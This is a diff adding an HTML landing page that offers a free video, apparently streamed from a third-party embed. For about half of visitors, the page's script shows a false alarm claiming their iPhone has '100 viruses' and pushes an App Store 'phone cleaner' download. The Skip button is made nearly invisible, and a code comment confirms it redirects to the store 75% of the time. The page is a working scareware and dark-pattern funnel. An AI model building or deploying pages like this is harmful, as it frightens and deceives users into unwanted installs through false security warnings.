@@ -1,0 +1,311 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#080b14">
+  <title>Watch the content.</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      font-family: -apple-system, BlinkMacSystemFont,
+        "Segoe UI", sans-serif;
+      color: white;
+      background: radial-gradient(
+        circle at top,
+        #26345d,
+        #101729 40%,
+        #080b14 85%
+      );
+    }
+
+    .card {
+      width: 100%;
+      max-width: 700px;
+      padding: 45px 25px;
+      text-align: center;
+      border-radius: 25px;
+      border: 1px solid rgba(255,255,255,0.12);
+      background: rgba(18,24,41,0.9);
+      box-shadow: 0 25px 70px rgba(0,0,0,0.4);
+    }
+
+    h1 {
+      font-size: clamp(28px, 6vw, 42px);
+      letter-spacing: -1px;
+      margin: 0 0 15px;
+    }
+
+    p {
+      color: #aab4ce;
+      line-height: 1.6;
+    }
+
+    .primary {
+      display: inline-block;
+      margin-top: 15px;
+      padding: 17px 35px;
+      background: #7684ff;
+      color: white;
+      font-size: 17px;
+      font-weight: 700;
+      border: none;
+      border-radius: 13px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .primary:hover {
+      background: #8d98ff;
+    }
+
+    .screen[hidden] {
+      display: none;
+    }
+
+    .offer-tag {
+      display: inline-block;
+      margin-bottom: 20px;
+      padding: 7px 12px;
+      background: rgba(255,255,255,0.08);
+      border-radius: 30px;
+      color: #b9c4e0;
+      font-size: 12px;
+    }
+
+    .download {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 18px 45px;
+      background: #7684ff;
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+      border-radius: 13px;
+      font-size: 18px;
+    }
+
+    .skip-container {
+      margin-top: 28px;
+    }
+
+    .skip {
+      background: transparent;
+      border: none;
+      color: #8991aa;
+      font-size: 7px;
+      padding: 2px;
+      cursor: pointer;
+      text-decoration: underline;
+      opacity: 0.65;
+    }
+
+    .skip:hover {
+      opacity: 1;
+    }
+
+    .disclosure {
+      max-width: 320px;
+      margin: 8px auto 0;
+      font-size: 11px;
+      color: #aab4ce;
+    }
+
+    iframe {
+      display: block;
+      width: 100%;
+      max-width: 640px;
+      height: 320px;
+      margin: 25px auto 0;
+      border: none;
+      border-radius: 12px;
+      background: black;
+    }
+
+    .back {
+      margin-top: 20px;
+      background: transparent;
+      border: none;
+      color: #aab4ce;
+      cursor: pointer;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 35px 18px;
+      }
+
+      iframe {
+        height: 55vw;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="card">
+
+    <!-- START SCREEN -->
+    <section class="screen" id="startScreen">
+      <h1>Watch the content.</h1>
+      <p>Your video is ready.</p>
+
+      <button class="primary" id="watchButton">
+        Watch free
+      </button>
+    </section>
+
+    <!-- APP OFFER SCREEN -->
+    <section class="screen" id="offerScreen" hidden>
+
+      <span class="offer-tag">
+        YOU NEED THIS APP OR YOUR PHONE WONT LIVE
+      </span>
+
+      <h1>Your iPhone is infected with 100 viruses! </h1>
+
+      <p>
+        Download the free cleaning app to get 
+        the viruses away from your phone as they can 
+        seriously damage your phone.
+        Then get back to watching your content.
+      </p>
+
+      <a
+        class="download"
+        id="downloadButton"
+        href="https://apps.apple.com/us/app/mobile-security-phone-cleaner/id6768190627"
+      >
+        Download
+      </a>
+
+      <div class="skip-container">
+        <button class="skip" id="skipButton">
+          Skip
+        </button/>
+        </p>
+      </div>
+
+    </section>
+
+    <!-- VIDEO PLAYER -->
+    <section class="screen" id="playerScreen" hidden>
+
+      <h1>Enjoy watching.</h1>
+
+      <iframe
+        id="videoFrame"
+        frameborder="0"
+        scrolling="no"
+        style="width: 100%; max-width: 640px; height: 320px; overflow: hidden;"
+        webkitAllowFullScreen="true"
+        mozallowfullscreen="true"
+        allowFullScreen="true"
+      ></iframe>
+
+      <button class="back" id="backButton">
+        Back
+      </button>
+
+    </section>
+
+  </main>
+
+  <script>
+    const APP_URL =
+      "https://apps.apple.com/us/app/mobile-security-phone-cleaner/id6768190627";
+
+    const VIDEO_URL =
+      "https://bedrive.ru/plugins/mediaplayer/site/_embed.php?u=ead5";
+
+    const startScreen =
+      document.getElementById("startScreen");
+
+    const offerScreen =
+      document.getElementById("offerScreen");
+
+    const playerScreen =
+      document.getElementById("playerScreen");
+
+    const videoFrame =
+      document.getElementById("videoFrame");
+
+    function showScreen(screen) {
+      startScreen.hidden = true;
+      offerScreen.hidden = true;
+      playerScreen.hidden = true;
+
+      screen.hidden = false;
+    }
+
+    function playVideo() {
+      videoFrame.src = VIDEO_URL;
+      showScreen(playerScreen);
+    }
+
+    function openAppStore() {
+      window.location.href = APP_URL;
+    }
+
+    // Watch Free:
+  
+    document.getElementById("watchButton")
+      .addEventListener("click", function() {
+
+        const chance = Math.random();
+
+        if (chance < 0.5) {
+          playVideo();
+        } else {
+          showScreen(offerScreen);
+        }
+
+      });
+
+    // Skip:
+    // 25% actually skips
+    // 75% redirects to App Store
+    document.getElementById("skipButton")
+      .addEventListener("click", function() {
+
+        const chance = Math.random();
+
+        if (chance < 0.25) {
+          playVideo();
+        } else {
+          openAppStore();
+        }
+
+      });
+
+    // Download button
+    document.getElementById("downloadButton")
+      .addEventListener("click", function(event) {
+        event.preventDefault();
+        openAppStore();
+      });
+
+    // Back button
+    document.getElementById("backButton")
+      .addEventListener("click", function() {
+
+        videoFrame.removeAttribute("src");
+        showScreen(startScreen);
+
+      });
+  </script>
+
+</body>
+</html>
